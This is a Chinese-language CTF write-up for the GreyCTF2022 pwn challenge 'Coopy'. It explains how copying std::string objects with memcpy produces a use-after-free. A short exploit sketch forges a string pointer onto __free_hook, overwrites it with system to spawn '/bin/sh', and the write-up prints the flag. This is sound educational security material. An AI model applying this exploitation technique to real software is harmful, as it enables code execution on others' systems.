# GreyCTF2022 - Coopy

## 题目简述

程序自行实现 `Vector`，扩容时用 `memcpy` 搬运 C++ `std::string` 对象。`std::string` 不是可平凡复制类型：长字符串内部保存堆指针，按字节浅拷贝后，新旧对象会共享同一缓冲区，析构或编辑随即产生 UAF 与任意指针控制。

## 解题过程

先放入足够长、必然脱离 small-string optimization 的字符串，再触发 vector 扩容。旧数组释放时字符串析构释放缓冲区，但新数组中的浅拷贝仍保存原指针。通过显示悬空字符串泄露堆/库地址，再利用可编辑的字符串对象伪造其数据指针和长度。

```python
add(long_string)
grow_vector()                # memcpy std::string，制造浅拷贝
heap_leak = show(0)

# 伪造 string 的 data pointer 指向 __free_hook
forge_string(data=libc.sym['__free_hook'], size=8, capacity=8)
edit(forged_index, p64(libc.sym['system']))
```

最后创建内容为 `/bin/sh\x00` 的长字符串并触发释放，实际调用变为 `system("/bin/sh")`，读取：

```text
grey{d0nt_c0py_1n_3x4ms}
```

## 方法总结

含指针、所有权或虚表的 C++ 对象不能用 `memcpy` 代替移动/拷贝构造。利用时要先判断字符串是否走 SSO；只有堆字符串的浅拷贝才产生可复用的悬空指针。伪造对象时还需同时满足指针、长度和容量的不变量。
